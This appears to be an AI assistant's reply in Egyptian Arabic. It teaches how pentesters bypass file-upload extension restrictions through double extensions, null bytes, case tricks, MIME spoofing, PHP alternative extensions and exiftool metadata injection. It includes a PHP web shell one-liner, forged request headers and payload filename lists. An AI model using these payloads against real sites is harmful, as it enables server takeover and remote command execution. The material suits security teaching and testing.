تمام، هشرحلك موضوع "Bypassing File Extension Restrictions" بعمق كـ Pentester، مع تركيز على الجانب العملي والأكواد والأوامر، وهحط الخلاصة بالعامية المصرية بعد كل جزء، وبعدين هعدلك كل السيناريوهات الممكنة للاستغلال.

---

### **1. مفهوم Bypassing File Extension Restrictions بعمق**
المقصود هنا إنك بتحاول تتخطى القيود اللي الموقع بيحطها على امتدادات الملفات اللي بيسمح برفعها (زي `.jpg` أو `.png` بس). كتير من المواقع بتحدد نوع الملفات المسموحة عشان تمنع رفع ملفات خبيثة زي `.php` أو `.exe`، لكن لو الفلاتر أو التحقق ضعيف، تقدر تلف عليه وترفع ملف ينفذ كود برضو.

- **الثغرة بتحصل ازاي؟** لما الموقع بيعتمد على حاجة سطحية (زي فحص الامتداد بس) من غير ما يفحص محتوى الملف أو يمنع تنفيذه.
- **الهدف:** رفع ملف ينفذ كود (زي شيل) رغم إن الموقع بيقول "ممنوع غير الصور" مثلاً.

**مثال بسيط:**
لو موقع بيسمح برفع صور بس (`.jpg`, `.png`)، وإنت عايز ترفع شيل PHP، ممكن تغير شكل الملف أو تخدع النظام عشان يقبله ويشتغله.

**خلاصة بالعامية:**  
يعني الموقع بيقولك "ارفع صور بس"، بس إنت بتلعبله في دماغه وترفع حاجة تانية خبيثة وهو يقبلها ويفتحها كمان.

---

### **2. الجانب العملي: ازاي بنتخطى القيود دي**
هنشرح الطرق الشائعة مع أمثلة عملية:

#### **أ. استخدام Double Extensions**
الموقع ممكن يفحص الامتداد الأخير بس، فتقدر تضيف امتداد مقبول بعد الخبيث.

- **مثال عملي:**
  اعمل ملف شيل PHP كده (`shell.php.jpg`):
  ```
  <?php system($_GET['cmd']); ?>
  ```
  ارفعه على الموقع. لو السيرفر (زي Apache) بيتعامل مع `.php` كسكربت وينفذه رغم الـ `.jpg`، افتح:
  ```
  http://target.com/uploads/shell.php.jpg?cmd=whoami
  ```

- **أمر عملي كـ Pentester:**
  جرب امتدادات زي:
  ```
  shell.php.png
  shell.php.gif
  shell.php.jpeg
  ```

**خلاصة بالعامية:**  
كأنك بتقول للموقع "دي صورة عادي"، بس جواها سكربت بيخليه يشتغل زي ما إنت عايز.

#### **ب. استخدام Null Byte**
الـ Null Byte (`%00`) كان بيستخدم زمان عشان يقطع فحص الامتداد في السيرفر.

- **مثال عملي:**
  لو الموقع بيقبل `.jpg` بس، جرب ترفع ملف اسمه:
  ```
  shell.php%00.jpg
  ```
  في الـ HTTP Request (باستخدام Burp Suite)، عدل الـ Filename:
  ```
  Content-Disposition: form-data; name="file"; filename="shell.php%00.jpg"
  ```
  لو السيرفر قديم (PHP < 5.3.4 مثلاً)، هيقف عند الـ `%00` ويعتبر الملف `shell.php` وينفذه.

- **ملاحظة:** الطريقة دي مش شغالة في السيرفرات الحديثة كتير، لكن لسه بتستاهل التجربة.

**خلاصة بالعامية:**  
زي ما تكتب جملة وتقطعها في النص، فالموقع يشوف نصها الأولاني ويسيب الباقي يعدي.

#### **ج. تغيير Case Sensitivity**
بعض السيرفرات مش بتفرق بين الحروف الكبيرة والصغيرة في الامتداد.

- **مثال عملي:**
  جرب ترفع ملف بامتدادات زي:
  ```
  shell.PHP
  shell.PhP
  shell.pHp
  ```
  لو الموقع بيقبل `.php` بأي شكل، هيتنفذ.

**خلاصة بالعامية:**  
الموقع لو مش مركز في شكل الحروف، تقدر تلعب في الكتابة وتعدي حاجتك.

#### **د. تعديل الـ MIME Type**
الموقع ممكن يعتمد على الـ MIME Type (اللي بيحدد نوع الملف في الـ Request) بدل الامتداد.

- **مثال عملي:**
  اعمل ملف `shell.php`، لكن في Burp Suite غير الـ Request:
  ```
  Content-Type: image/jpeg
  Content-Disposition: form-data; name="file"; filename="shell.php"
  ```
  لو الموقع بيفحص الـ MIME Type بس وما بيشوفش الامتداد، هيقبل الملف وممكن يتنفذ.

- **أمر عملي كـ Pentester:**
  جرب MIME Types مختلفة:
  ```
  image/png
  application/octet-stream
  text/plain
  ```

**خلاصة بالعامية:**  
كأنك بتقول للموقع "دي صورة" في الورقة بتاعتها، بس الحقيقة حاجة تانية خالص.

#### **هـ. استخدام امتدادات بديلة**
بعض السيرفرات بتسمح بامتدادات غير شائعة زي `.php5` أو `.phtml` وبتنفذها كـ PHP.

- **مثال عملي:**
  اعمل ملف `shell.phtml`:
  ```
  <?php system($_GET['cmd']); ?>
  ```
  ارفعه، وجرب:
  ```
  http://target.com/uploads/shell.phtml?cmd=dir
  ```

- **أمر عملي:**
  جرب:
  ```
  shell.php5
  shell.phtml
  shell.inc
  ```

**خلاصة بالعامية:**  
الموقع لو مش عارف كل أنواع الملفات اللي المفروض يقفلهم، ممكن ترفع حاجة غريبة وتعدي.

#### **و. تضمين كود في ملفات مقبولة**
لو الموقع مش بيفحص محتوى الملف، ممكن تخبي كود في صورة أو PDF.

- **مثال عملي:**
  اعمل صورة بكود PHP باستخدام `exiftool`:
  ```
  exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
  ```
  ارفعها، ولو السيرفر بينفذ الـ Metadata، افتح:
  ```
  http://target.com/uploads/image.jpg?cmd=whoami
  ```

**خلاصة بالعامية:**  
حتى لو الموقع بيقول "صور بس"، ممكن تحط جواها حاجة خبيثة ويشتغل عادي لو مش بيبص كويس.

---

### **3. سيناريوهات الاستغلال الممكنة كـ Pentester**
دلوقتي هعدلك كل الطرق اللي ممكن تستغل بيها الثغرة دي:

1. **Double Extensions:**
   - رفع `shell.php.jpg` أو `shell.php.png` والتحكم في السيرفر.

2. **Null Byte:**
   - `shell.php%00.jpg` لتخطي فحص الامتداد في سيرفرات قديمة.

3. **Case Sensitivity:**
   - `shell.PHP` أو `shell.pHp` لو الموقع مش بيفرق بين الحروف.

4. **MIME Type Manipulation:**
   - تغيير الـ Content-Type لـ `image/jpeg` مع ملف `shell.php`.

5. **Alternative Extensions:**
   - رفع `shell.php5` أو `shell.phtml` لو السيرفر بيدعمهم.

6. **Malicious Content in Allowed Files:**
   - تضمين PHP في صورة (`exiftool`) أو JavaScript في PDF.

7. **Path Traversal مع Upload:**
   - لو الموقع بيسمح بكتابة مسار الملف، جرب:
   ```
   ../../shell.php.jpg
   ```

8. **Server Misconfiguration:**
   - لو السيرفر بينفذ أي ملف بغض النظر عن الامتداد (زي `.txt` مع كود PHP)، استغل ده.

---

### **نصيحة كـ Pentester:**
- استخدم **Burp Suite** عشان تعدل الـ Requests (Filename, Content-Type).
- جرب كل الامتدادات الممكنة وشوف ايه اللي بيعدي.
- لو الملف اترفع بس ما نفذش، جرب تستدعيه بطرق تانية (زي LFI أو Command Injection).
- ابحث عن ردود السيرفر (Errors) عشان تعرف هو بيفحص ازاي.

لو عايز تفاصيل أكتر عن أي سيناريو أو أداة، قوللي!